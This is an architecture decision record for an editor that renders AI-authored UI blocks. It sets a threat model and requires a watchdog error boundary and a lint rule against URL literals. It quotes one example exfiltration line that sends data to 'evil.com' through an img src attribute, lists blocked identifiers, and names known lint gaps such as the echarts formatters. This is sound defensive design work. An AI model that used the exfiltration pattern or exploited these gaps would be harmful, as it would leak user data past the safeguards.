# Authored-block threat model: AI hallucination + compromised-sender; defer insider + spoofing to v1.1

**Status:** accepted (extends ADR-0001 with new lint + watchdog requirements; prerequisite of any Authored-block — Tier 3 per ADR-0004 — implementation)
**Date:** 2026-05-27

## Context

ADR-0004 chose Option B for the Authored-block trust gate: the lint (extended per ADR-0001) plus the runtime watchdog, with no human review per block. ADR-0001's lint + watchdog were designed for Brand blocks (Tier 2), where they were one layer on top of a human reviewer; for Authored blocks they are the *only* automated gate.

Inspection of the current implementation surfaces gaps that matter at Tier 3:

- The lint ([src/setup/lint-generated.ts](../../src/setup/lint-generated.ts)) catches non-whitelist imports, `dangerouslySetInnerHTML`, `eval`/`fetch`/`XMLHttpRequest`/`WebSocket`/`Function`, member access rooted at `window`/`document`/`parent`/`top`/`localStorage`/`cookie`, `postMessage()`, and intrinsic prototype patching. It does **not** check URL-bearing JSX attributes (`src`, `href`, `action`, etc.) or CSS `url()` literals, so `<img src="https://evil.com/?data=" + sensitiveData />` is not caught.
- The watchdog ([src/block-primitives/RenderWatchdog.tsx](../../src/block-primitives/RenderWatchdog.tsx)) measures one rule: render duration over 50 ms. There is no error boundary, so a block that throws on edge-case data crashes the surrounding editor rather than degrading to a placeholder.

Before locking the gate, the threat model needs to be explicit so future changes can be evaluated against it.

## Decision

Four candidate threat classes were considered:

| | Threat | Defended in v1? |
|---|---|---|
| (a) | AI hallucination — buggy code, no malice | **Yes — guaranteed** |
| (b) | Compromised sender machine — well-meaning author, poisoned output | **Yes — credible over 3+ years at 30-consultant scale** |
| (c) | Malicious insider — deliberate exfil by an authorised consultant | Deferred to v1.1 hardening pass |
| (d) | Phishing / spoofed sender — external attacker as `alice@consultancy.com` | Deferred to v1.1 hardening pass (ADR-0005 already flagged) |

To cover (a) + (b), the following hardening is a prerequisite of any Authored-block implementation:

1. **Add an error boundary to the render watchdog.** A block that throws during render is caught and replaced with a placeholder, identically to the existing render-budget path. Required for (a) — buggy AI output is guaranteed.
2. **Extend the lint with a URL-attribute rule.** Reject any literal `http://` or `https://` string appearing as the value of a JSX attribute (`src`, `href`, `action`, `srcset`, `formaction`, `poster`, `data`, `cite`) or inside a CSS `url(...)` literal in a `style` prop. Brand-token references and document-scoped `assets/` paths are not literals, so they are not affected. Required for (b) — closes the most realistic exfiltration channel against the existing import/identifier blocklist.

These two changes are prerequisites of Tier 3 ship. They are not prerequisites of M8 (which ships Brand blocks under D-09's human-review gate; the human catches what the lint misses).

## Rejected alternatives

- **Defend against (a) only.** Plausible given that consultants are trusted internal staff today, but the 30-consultant / 3-year horizon makes (b) likely enough that paying the URL-attribute lint cost now is cheaper than retrofitting after the first incident. Rejected on a precautionary-cost basis.
- **Defend against (c) and (d) in v1.** Requires signed bundles, key distribution, revocation, and a per-sender trust UI — a quarter of work for a v1 deferral. The "unknown sender" affordance noted in ADR-0005 is the cheapest first step in the v1.1 hardening pass, but neither it nor full signing belong in v1.
- **Run the watchdog inside an iframe to contain throws.** Brings back the iframe overhead that ADR-0001 explicitly rejected. Error boundary is the lighter-weight equivalent and matches the existing architecture.
- **Skip the URL-attribute lint and rely on a CSP at the renderer level.** Tauri's WebView CSP can be configured, but it's a global setting affecting all blocks (including Brand and Standard) and the brand tokens require some flexibility. Lint-time URL filtering is the more surgical option and matches where the rest of the static defenses live.

## Consequences

- **The watchdog and lint become parts of the contract for Tier 3.** Loosening them later is a security regression; any change to either file should reference this ADR.
- **Echarts is still whitelisted, and its formatter functions remain a soft gap.** A determined attacker who controls the block source could pass executable strings to echarts; the lint cannot easily distinguish malicious formatters from legitimate ones. Accepted as a known limitation against (c); add to the v1.1 hardening scope if a concrete exploit emerges.
- **The watchdog still measures one component at a time.** A block with thousands of cheap sub-components can collectively block the editor without tripping the per-render budget. Not addressed in this ADR; can be added later if the threat materialises.
- **M9 task list gains two prerequisite tasks** before any Tier 3 work: watchdog-error-boundary, lint-url-attribute-rule. Both small (~½–1 day each), independently mergeable, no behaviour change for Standard or Brand blocks.
- **D-09's "six mitigations" framing is implicitly extended.** ADR-0001 already supersedes mitigation #5; this ADR adds two implementation requirements under mitigations #2 (whitelisted imports / lint) and #5 (runtime watchdog) for the Tier 3 case specifically.
